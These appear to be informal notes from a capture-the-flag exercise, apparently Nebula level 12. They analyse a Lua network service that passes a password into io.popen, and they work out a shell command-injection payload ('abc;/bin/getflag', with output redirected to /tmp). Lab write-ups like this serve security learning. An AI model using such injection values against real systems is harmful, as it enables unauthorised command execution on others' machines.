possible vulnerable points:
1. io.popen("echo "..password.." | sha1sum", "r")
2. local line, err = client:receive()
		print("trying " .. line)
3. find the string whose hash is 4754a4f4bd5787accd33de887b9250a0691dd198

io.popen:
all of above are possible points that user can pass value into the program
Starts program prog in a separated process and returns a file handle that you can use to read data from this program (if mode is "r", the default) or to write data to this program (if mode is "w").

This function is system dependent and is not available on all platforms.
I.
	1. enter something like ;/bin/getflag
	2. echo "..password.." -----> echo ***;/bin/getflag
or
II.
	1. find the process started by lua
	2. change the content in the file handle to 4754a4f4bd5787accd33de887b9250a0691dd198
for I:
try echo abc;/bin/getflag in the ternimal
abc
getflag is executing on a non-flag......
This may work.

lua flag12.lua
the output indicates the program is already running
nc 127.0.0.1 50001
Password: abc;/bin/getflag
Better luck next time

recall what we have encountered in level03
The;/bin/getflag may be executed already, let's redirect the output to a temp file
Password: abc > /tmp/test
cat /tmp/test //then the content is abc
so try this:
Password: abc;/bin/getflag > /tmp/test
cat /tmp/test
You have successfully.......
